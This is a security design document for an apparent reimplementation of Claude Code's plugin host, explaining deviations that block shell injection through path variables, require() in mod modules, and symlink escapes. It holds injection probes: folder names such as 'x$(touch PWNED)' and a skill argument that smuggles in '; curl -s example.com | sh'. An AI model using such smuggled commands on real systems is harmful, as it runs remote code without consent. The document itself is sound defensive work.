# Security

Where the kit is deliberately stricter than Claude Code, and risks it leaves to the host.

The kit reproduces what Claude Code does that a user can observe. The exception is behaviour that is
a security hole. There the kit is safe by default, this page says what it does differently, and an
option restores Claude Code's behaviour when one exists. Each deviation below gives what Claude Code
does (a doc quote, or a black-box observation with the release it was made on), an input that shows
the hole, the kit's default, what the change costs real plugins (counted over the corpus of
docs/TESTING.md, "Corpus"), and the option. The judgments are recorded in `spec/judgments.md`
(`shellPaths`, `requireCall`).

The observations were made with `claude -p` against a fake Messages API (the method of
`scripts/oracle/model-request.ts`) on Claude Code 2.1.322, the docs being those of 2.1.321.

## Deviations

### Path variables in strings a shell parses

All three cases below are governed by one host option, `PluginHostOptions.shellPaths`
(`SubstitutionScope.shellPaths` for a resolver called directly), read by one function,
`surfacePolicy` in `src/loading/resolve/surfaces.ts`. Hooks are not among them: Claude Code pastes
into no hook, so the option does not apply to one (next section). The values go into the process environment through one
function, `shellExports` in `src/loading/resolve/shell-exports.ts`.

- `'environment-reference'` (the default) writes `${CLAUDE_PLUGIN_ROOT}`, `${CLAUDE_PLUGIN_DATA}`,
  `${CLAUDE_PROJECT_DIR}` and `${CLAUDE_SKILL_DIR}` as the braced reference. The process gets each
  referenced path as an environment variable, so the shell reads it after parsing and never parses
  it. PowerShell gets `${env:NAME}`.
- `'pasted'` writes the path into the text where Claude Code pastes it: a `!` block, a plugin's
  `headersHelper` and a monitor `command`, as the docs show it. Nothing is exported for those.

Why the default is not quoting. The docs' advice, "wrap the variable in double quotes so a path with
spaces stays one word" (plugins/manifest-reference.md, "Quoting and path separators"), keeps spaces
together. It does not stop a shell from running `$(...)`, a backtick, or a `"` that closes the quotes
early. Correct escaping depends on the quotes around the variable (none, double, single, inside a
nested `$( )`), and no single escaping is right in all of them. A reference is never parsed again, in
any quoting.

Known limits of the default:

- Inside single quotes a reference is not expanded. `'${CLAUDE_PLUGIN_ROOT}/x'` stays that text: it
  never runs, and it never finds the file either.
- On Windows the environment holds the native path (`C:\Users\...`), not the forward-slash form the
  docs show in pasted text.

#### Skill and command `!` blocks

What Claude Code does. skills.md, "Available string substitutions", says of `${CLAUDE_SKILL_DIR}`:
"Use this in bash injection commands to reference scripts or files bundled with the skill". Observed
on 2.1.322: the paths are pasted into the command before it runs. A plugin installed under a folder
named `x$(echo INJECTED)y` ran a `!` block that printed `"${CLAUDE_SKILL_DIR}"`, and the output
was `DQ[.../xINJECTEDy/probe/skills/p]` whenever the command was allowed: with `permissions.defaultMode: "bypassPermissions"`, or with
`permissions.allow: ["Bash"]`. In default mode the permission check refused it, and its message
showed the pasted path. Single quotes do not help: `'${CLAUDE_SKILL_DIR}'` was pasted too.

Why it is unsafe. The folder name comes from outside the skill: a project folder (`CLAUDE_PROJECT_DIR`),
a marketplace or plugin name in the install path, or a checkout's name. A folder named
`x$(touch PWNED)` runs `touch` in every allowed `!` block that names the path, in the double quotes
the docs recommend. `tests/host/skill-shell-paths.test.ts` shows it through the public session, using
a folder name with `$(...)`, backticks, both quotes and `;`.

The kit's default. The shell receives the references, and the process environment carries the paths
the command names. The refusal check, the permission check (`ShellPermission`, `ShellCall.command`),
the `allowed-tools` grants and auto mode's "run the command first" instruction all read the command
with the paths written in, as data. That is the text a settings rule, or an `allowed-tools` rule
substituted the same way, is written against, so permission decisions match Claude Code's.
`PlannedCommand.command` is that text; `PlannedCommand.shellCommand` and `environment` are what
`CommandRunner` receives. `$ARGUMENTS` stays pasted (see "Risks the host owns").

The cost. In the corpus, 149 `SKILL.md` files and 45 command files have a `!` command that names a
path variable. None of them names it inside single quotes, so the default changes the output of
none of the 194.

The option. `shellPaths: 'pasted'`.

#### MCP `headersHelper` of a plugin

What Claude Code does. plugins/manifest-reference.md, "Where each variable resolves", lists
`headersHelper` among the fields where `${...}` resolves, and lists nothing exported to it. Observed on
2.1.322: a plugin under `x$(echo INJECTED)y a b` with an unquoted `${CLAUDE_PLUGIN_ROOT}` in its
helper ran the substitution and printed `U[.../xINJECTEDy]U[a]U[b/probe]`.

Why it is unsafe. The same folder name runs as shell each time the server connects.

The kit's default. The helper's text keeps the references. `HelperServer.paths` holds the paths
it references, and `planHeadersHelper` puts them in the helper's environment. `tests/host/shell-paths.test.ts` proves it.

The cost. One `headersHelper` in the corpus, and it names no path variable: 0 of 1.

The option. `shellPaths: 'pasted'`.

#### Monitor `command`

What Claude Code does. plugins/manifest-reference.md: `${...}` resolves "Anywhere in `command`", and
the variables are "Not exported". Not observed: monitors do not start under `-p`.

Why it is unsafe. The same as for a hook: the command is a shell string.

The kit's default. `ResolvedMonitor.command` keeps the references, and `ResolvedMonitor.environment`
(and `MonitorStart.env`) carries the paths it references. `tests/host/shell-paths.test.ts` proves it.

The cost. 4 of the 6 `monitors.json` files name a path variable. The one written in single quotes
passes the text to an inner `bash -c`, which reads it from the environment, so 0 of 4 change.

The option. `shellPaths: 'pasted'`.

### `require()` in a hooks module

What Claude Code does. plugins/mods/create.md: "Write every file as an ES module, with `import` and
not `require`", and "Import only from files inside the plugin directory". Observed on 2.1.321:
`claude plugin validate` passes a hooks module that calls `require('fs')`, and `claude -p
--plugin-dir` loads it and runs its hooks; a module that declares its own `require` loads too. A
dynamic `import()` is refused at validate and at load, as the kit refuses it.

Why it is unsafe. The import rules are what keep a mod to its own files and `claude-code`. On Bun,
the runtime the kit's hosts use, `require` exists inside an ES module, so a written `require('../x')`
or `require('child_process')` reaches any file or package the process can, past those rules, and the
review the scan's `calls:` and `env` lines give an admin (admin.md, "Review what a mod can do") does
not show it.

The kit's default. Every `require(` call is refused at load, wherever it is written, with
`require() is not available; write every file as an ES module with import`; a locally declared
`require` is refused too, since the scan does not follow bindings. `tests/mods/load/scan-require.test.ts`
proves it.

The cost. 0 mods: no plugin of the corpus ships a hooks module (`hooks.json` `modules`).

The option. None: the docs ask for `import` already, so a mod that follows them is unaffected.

The scan is a check, not a sandbox: `import.meta.require`, `Bun` and `process` are still reachable
from a module that runs. Isolating the runtime is the host's (see "Risks the host owns").

### Bash shell-form hooks are not a deviation

plugins/manifest-reference.md says `${...}` resolves "Anywhere in `command` and `args`" of a hook.
Observed on 2.1.322, Claude Code does not paste into a bash shell-form hook. A quoted heredoc printed
`${CLAUDE_PLUGIN_ROOT}|${CLAUDE_PROJECT_DIR}|${CLAUDE_PLUGIN_DATA}` as written. An unquoted
reference under `x$(echo INJECTED)y a b` was split into words but did not run the `$(...)`. A
single-quoted one stayed `${CLAUDE_PLUGIN_ROOT}`. The kit does the same, always: a bash shell-form
hook keeps `${NAME}` and its process environment carries all three paths, whatever `shellPaths`
says, as a PowerShell hook always gets `${env:NAME}`. There is no option that pastes into a hook.

Of the 613 `hooks.json` files that name a path variable, 5 put it in single quotes the shell never
expands, such as `bash '${CLAUDE_PLUGIN_ROOT}/x.sh'`. They fail in Claude Code too.

### Checked and not deviations

These security changes in CHANGELOG.md follow Claude Code or its docs, so they are fixes:

- The `./` deny rule under a linked working directory. Claude Code 2.1.322, started in `/tmp/...`
  (a link to `/private/tmp/...`), lists both spellings as working directories
  (`tests/rules/path-symlink-anchors.test.ts`).
- A hook's `updatedInput` checked through a symbolic link. hooks.md says the rules read the returned
  input; permissions.md describes the link check (`tests/host/check-tool-symlink.test.ts`).
- Variables that only the launching environment sets. env-vars.md: "Set it in the environment that
  launches Claude Code, because Claude Code ignores it in a setting"
  (`tests/settings/env/settings-env-ignored.test.ts`).
- npm specifiers a marketplace may not name. plugins/marketplace-reference.md lists them
  (`tests/marketplace/node-deps-spec.test.ts`).
- `Read` and `Edit` deny and ask rules on the files that `less`, `more`, `bat`, `xxd`, `shasum`,
  `source`, `.`, `yq`, `du`, `truncate`, `chmod`, `chown`, `install`, `ln` and `rsync` name. Claude
  Code 2.1.322 does not check these commands' paths: `less /etc/hosts` ran under a `Read(//etc/**)`
  deny, and `chmod` ran on a file an `Edit` deny covers. A deny rule that a different reader of the
  same file walks past is a hole, so the kit applies the deny and ask rules to them. It does not ask
  for their paths outside the working directories, as Claude Code does not
  (`src/rules/decide/file-targets.ts`, `tests/rules/bash-file-targets.test.ts`).
- An abandoned mods dispatch never runs Claude Code's own behaviour (`abortedCore`). A `tool.call`
  guard that fails after the user stopped the turn used to be skipped and the tool ran. The
  declarations say `next.signal` "Aborts when the call this dispatch belongs to is abandoned" and
  that an abort "dropped it before it ran" (claude-code/index.d.ts:6999, :10821), so the dispatch now
  rejects with the abort's reason. A guard that fails while the call is live is still skipped and
  the call runs: reference.md, "Limits", declares that fail-open, and its remedy is the hook's
  `.catch` handler, which may answer a refusal (`tests/mods/chain/aborted-dispatch.test.ts`).
- `$.http.fetch`'s `auth` handle (`httpInit`). The declarations say it "rides https only" and is
  refused under `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`; the kit also drops it on a redirect to
  another origin, as it drops the request headers that may hold a credential (api.md;
  `tests/mods/api/http-init.test.ts`).
- An archive whose links lead outside it is refused whole. A link is found by its name as a file
  system that folds names compares it (letter case, Unicode normalization, trailing dots and
  spaces), so `a/x` counts as written through a link stored as `A`, and a link that shares its
  name with another entry is refused. The docs say nothing about this, and it could not be
  observed: an archive URL must be `https://` and not a loopback address. This one is left open
  (`tests/marketplace/archive-scan.test.ts`).

## Risks the host owns

The kit decides; the host's ports act. These are the risks no kit default removes.

- **Running hook commands at all.** A `command` hook is code from the plugin. The kit plans the run
  (shell, environment, scrubbed credentials, timeout) and checks workspace trust from the facts the
  host reports. `CommandRunner` then runs whatever it is handed, with the host's privileges. Sandboxing
  is the host's job.
- **`$ARGUMENTS` in `!` blocks.** skills.md: arguments are "available via the `$ARGUMENTS`
  placeholder", and the kit pastes them into a `!` command as typed, as Claude Code does. The model
  can invoke a skill with arguments too. `` !`git log $ARGUMENTS` `` with the argument
  `--oneline; curl -s example.com | sh` is a compound command. The permission check sees that whole
  text, so a narrow rule such as `Bash(git log *)` does not cover it. A skill whose `allowed-tools`
  grants `Bash`, or a session in `bypassPermissions`, runs it. Quoting arguments is the skill
  author's job, unless the host passes `shellArguments: 'environment-reference'`: a bash command
  then gets each placeholder as a reference to a variable holding the value, and the check reads
  the command with each value quoted where it lands (`tests/host/skill-shell-arguments.test.ts`).
  PowerShell commands stay pasted.
- **`${user_config.KEY}` in `!` blocks.** Skill content gets non-sensitive option values pasted in,
  `!` commands included (sensitive ones become a placeholder). A value holding shell syntax runs as
  shell. The user sets the values; the host decides whether to let them hold anything.
- **Trust prompts.** `workspaceTrustState`, `contentGate`, `settingsHooksMayRun` and the other trust
  functions are pure. The host shows the dialog, stores the answer, and reports whether the session
  is non-interactive. A host that reports a folder trusted without asking runs its hooks and
  `headersHelper`.
- **Running a mod's code.** The hooks module runs in the host's `ModRuntime`. The scan refuses
  `require()`, dynamic `import()` and imports outside the plugin, but a module that runs can still
  reach `import.meta.require`, `Bun`, `process` and the globals of its runtime. Running it in an
  isolate or a worker without them is the host's job.
- **The ports.**
  - `CommandRunner` runs `!` commands, hooks and status lines.
  - `HttpClient` fetches `http` hooks, archives and marketplaces. Egress policy is the host's.
  - `ArchiveReader` lists a zip and the host unzips it. The kit judges the entry list only, by
    name. A host reads a link's target with a bound (it is a path, not a file), and before it
    writes an entry or creates a link it checks that the real path of the parent folder is inside
    the destination: names alias in ways no list shows (a short `8.3` name, a mount, a folder that
    was already there).
  - `StagedDirectory.commit` and any other copy of a plugin tree apply a `TreePlan`. The plan
    decides only the links of the entries it was given. A host copies a dereferenced directory
    without following a link inside it: it lists that directory and plans it again (`planTreeCopy`
    with its real path in `TreeRoots.copying`), or leaves its links out. A copy that follows links
    (`cp -RL`, `fs.cp` with `dereference`) reads outside the marketplace, which the docs skip "for
    security" (plugins/host-marketplace.md, "Share files within a marketplace with symlinks"), and
    links that fan out over several levels multiply what is copied, so a host bounds it.
  - `Environment` answers `${VAR}` in configs. A plugin's MCP `url` or `headers` can name any
    variable it exposes, so the host decides which variables to expose. For a server of the
    local, project or user scope, `expandMcpServer(name, server, lookup, { readsAsEmpty })` adds the
    host's own names to the ones that read as empty toward a remote server; it never removes one of
    Claude Code's (`tests/format/mcp-env-host-credentials.test.ts`).
  - `PluginFiles` and `Locations` decide which files a plugin sees and where its data folder lives.
  - `ModelRunner` and `McpCaller` run prompts and tool calls on the host's behalf.

## Known differences that are not security choices

Bash files outside the working directories and the wrappers the read-only set sees through were
aligned with Claude Code 2.1.322 (spec/judgments.md). What is left:

- **Stricter.** `ls $HOME/work` ran in Claude Code, which expands `$HOME`; the kit asks for any
  operand a variable writes. `cd /etc && ls` ran under a `Read(//etc/**)` allow; the kit asks for a
  `cd` outside whatever the rules say.
- **Less strict.** `git diff /etc/hosts` was refused ("may only access files with git"); the kit
  does not check `git`'s path operands.

Neither is a security choice; both are to be brought to parity.
